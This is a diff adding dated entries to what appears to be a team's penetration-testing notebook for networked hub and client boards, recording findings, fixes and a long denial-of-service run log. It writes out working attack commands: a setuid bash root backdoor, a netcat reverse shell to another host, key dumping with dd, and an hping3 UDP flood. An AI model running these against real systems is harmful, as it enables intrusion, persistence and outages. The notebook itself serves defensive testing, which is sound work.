@@ -57,3 +57,114 @@
 		- Will the access only be from one EUD to another
 		- Will there be an unencrypted tunnel that we can access
 		- If there is a callback that the boards make, that is going to be an issue
+- **4/8/24 Going over new vulnerabilities and scans**
+	- Basic file findings
+		- hosts.allow
+			- please make a basic whitelist of allowed hosts that should be able to access the system on their own. This shouldn't be hard.
+		- hosts.deny
+			- Again a basic blacklist of people who are not allowed to access the system please implement something like this on the final product.
+	-  Linux XZ exploit
+		- According to Ubuntu community forums this exploit cannot be used to affect their systems. No versions of xz that are in Ubuntu can be used by this backdoor as of writing this information
+		- Further checking on Abram's side, the version we have is 5.2.4 and "That is much too old to have that"
+	- Bash Exploit
+		- Checking to see if a basic exploit can be used to allow any user (including non sudo users) access to a root terminal
+			- Commands executed
+				- bash
+					- executes a terminal within the terminal
+				- sudo chmod +s /bin/bash
+					- Sets a set UUID to use a bash terminal
+						- Removes a need for sudo
+		- This works and infact works a little too well. If an attacker gets a root based account they can set this up which will in turn allow a set backdoor into the system for later use. 
+		- However this is obvious and any maintainer of the software should be able to see it as it uses "-bash-5.0" instead of "< username >@ < connected board > - frontend" 
+		- A basic fix would be to restrict the root password to something else completely different than the login. 
+			- Ubuntu server should allow this.
+	- Vuln Scans and what they return
+		- Website might have something vulnerable on it. Nmap could not give a sure fire response on that
+	- Basic switching to root
+		- sudo -i works without needing a password what so ever
+			- Grants a root terminal
+	- SSH
+		- Allows you to pass through a command and have it return back to the user
+		- Fix
+			- Actually make a proper config file for ssh
+	- Netcat
+		- Commonly used tool for creating a reverse shell to the users computer. Has too many exploits for it to be on the system entirely
+		- Commands ran to get this to work
+			- Attacker
+				- nc nlvp < PORT >
+			- Boards
+				- mknod /tmp/backpipe p
+				- /bin/sh 0</tmp/backpipe | nc 192.168.0.50 1234 1>/tmp/backpipe
+		- Fix:
+			- disable it or uninstall it
+	- dd
+		- allows the attacker to dump the key
+		- even though it is only available for a short amount of time it is still possible to get the key from memory and dump it to the attackers local system which would allow it to decrypt any and all messages from the system.
+		- A basic script could automate all of this process
+		- FIX
+			- remove dd from the system if you do not NEED it
+	- Main cause of vulnerabilities
+		- Basic misconfigurations in the system.
+		- Unnecessary packages on the system.
+	- 4/9/24
+		- Step back from SSH
+		- Explore DOS
+		- Identify packages that are installed that do not need to be installed
+- **4/9/24**
+	- Exploring the DOS attacks again
+		- Previously we are able to hit offline for a period of time that exceeded a key transfer
+		- DOS will run for over 2 hours today
+			- Starting DOS at 12:34PM
+		-  Hitting hub offline as that seems to be the one that controls most of the transferring states
+	- Command that was ran
+		- sudo hping3 192.168.0.1 -2 -p 50002 --flood
+			- sudo: needs root privileges to open a port
+			- hping3: tool used to send the DOS attack
+			- 192.168.0.1: Hub IP address
+			- -2: uses the UDP protocol
+			- -p 50002: sets the port to the hubs port
+			- --flood: floods the port and does not send a reply
+	- The boards seem to be out of sync with each other, every so often the client seems to be searching for the hub board.
+	- After about 10 minutes of looking for the boards they seems to be in contact with one another. 
+	- Starting 3 DOS attacks from one machine to hopefully flood the hub board and not allow it to get any packets to the client board
+	- Started a new DOS attack ad 12:47PM with 3 different DOS attacks coming out of one kali machine.
+		- Client board seems to be searching for the hub board and cannot find it
+		- Client is sending packets of odd length to the hub but cannot get a response back.
+			- This is what we want to happen
+		- Not able to hit the client Hub board with a ping either.
+			- Good because this means all communication to the Hub board is cut off.
+		- Client goes into search mode every minute looking for hub
+			- Might be normal behavior, I forgot based from last semester
+		- 12:53 PM we got our first port unreachable response
+			- Makes me wonder if I need to give it more packets to make that port shut off entirely
+	- Packets still got through, I have no clue how they are getting out either
+	- Started more DOS attacks within my machine.
+	- Smaller amounts of packets are making it through. Started more DOS attacks to supplement this, now at 9 DOS attacks running at the same time
+	- 100% reducing the amount of packets going through to either side.
+		- Stopping the hub from being able to reach the client is key however figuring out how they are getting through to the client is going to be the next hardest thing
+	- one single packet still gets through, have one DOS set up to just hit all ports HOPEFULLY this blocks the traffic going in and out
+	- Figured it out, needed to not specify a port. The original command still is the same, just without the -p
+	- Even after stopping the original DOS they are no longer communicating
+		- Going to reset the boards and restart the DOS and see if this issue persists
+	- Starting a new DOS at 2:00 PM and letting it run for 2 hours total
+		- 16 total DOS terminals running at one time.
+	- This is not 100% guaranteed to happen all the time, either I do not have the hardware necessary or I am missing something else all together as the packets are still going through to the boards
+	- Going to continue and just let the DOS attack run for 2 hours as originally stated new update will be at 4:20 PM
+		- small update
+			- With 2 DOS command running the boards seem to have stopped communicating with each other. The client seems to be searching for the hub
+			- Client still searches for the hub constantly, I cant tell if the packets are being received by the hub however
+			- Been around 30 minutes or so and I have not seen the hub reach back out to the client, however the client is still capable of hitting the hub. Going to increase the DOS attacks from 4 to 6 and see if that stops all communication between the two
+				- Started at 3:00 PM
+			- Hub came through a minute later. Increasing the DOS from 6 to 8
+			- Hub kept coming through so I took the gloves off and used bare brass knuckles on this thing and hit it with all 16 DOS attacks
+				- Seemed to stop it, id hope
+					- 3:13 PM
+	- After running it for 2 hours total we stopped communications with them until 4:40 when we packed them up for the night.
+		- Going to run the same test again tomorrow to confirm my findings.
+		- Abram found some useful information and wrote it down on a notepad, going to transfer that here tomorrow
+	- 4/10/24
+		- Confirm findings from today
+		- Transfer Abrams notes from notepad to here.
+		- Research further on some packages and figure out what they actually need to run and what they do.
+			- Find vulnerabilities in the packages based on what they do
+			- ANALYZE SOURCE CODE FOR ANY INJECTION POINT!
